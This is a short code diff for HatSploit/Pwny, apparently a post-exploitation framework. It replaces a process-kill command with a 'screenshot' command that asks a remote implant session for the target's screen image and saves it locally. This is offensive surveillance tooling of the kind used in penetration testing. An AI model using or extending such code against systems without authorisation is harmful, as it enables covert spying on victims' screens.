@@ -8,30 +8,32 @@ from pwny.types import *
 
 from hatsploit.lib.command import Command
 
+UI_BASE = 6
+
+UI_SCREENSHOT = tlv_custom_tag(API_CALL_STATIC, UI_BASE, API_CALL + 12)
+
 
 class HatSploitCommand(Command):
     def __init__(self):
         super().__init__()
 
         self.details = {
-            'Category': "manage",
-            'Name': "kill",
+            'Category': "gather",
+            'Name': "screenshot",
             'Authors': [
                 'Ivan Nikolsky (enty8080) - command developer'
             ],
-            'Description': "Kill process by ID.",
-            'Usage': "kill <id>",
-            'MinArgs': 1
+            'Description': "Take screenshot.",
+            'Usage': "screenshot <local_path>",
+            'MinArgs': 1,
         }
 
     def run(self, argc, argv):
-        result = self.session.send_command(
-            tag=PROCESS_KILL,
-            args={
-                TLV_TYPE_PID: argv[1]
-            }
-        )
+        result = self.session.send_command(tag=UI_SCREENSHOT)
 
         if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
-            self.print_error(f"Failed to kill process {str(argv[1])}!")
+            self.print_error("Failed to take screenshot!")
             return
+
+        with open(argv[1], 'wb') as f:
+            f.write(result.get_raw(TLV_TYPE_BYTES))
